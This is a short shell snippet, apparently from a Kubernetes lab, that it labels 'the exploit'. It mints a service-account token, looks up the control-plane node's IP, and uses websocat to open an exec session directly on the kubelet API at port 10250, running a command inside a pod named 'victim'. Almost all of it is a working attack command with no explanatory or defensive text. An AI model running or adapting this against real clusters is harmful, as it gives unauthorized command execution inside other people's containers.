TOKEN=$(kubectl create token vuln-test-sa --duration=1h)

# Get the node's internal IP
NODE_IP=$(kubectl get node k8s-proxy-lab-control-plane -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')

# The exploit - using websocat to establish a WebSocket exec session
websocat -k \
  -H "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
   "wss://${NODE_IP}:10250/exec/default/victim/victim?output=1&error=1&command=id"
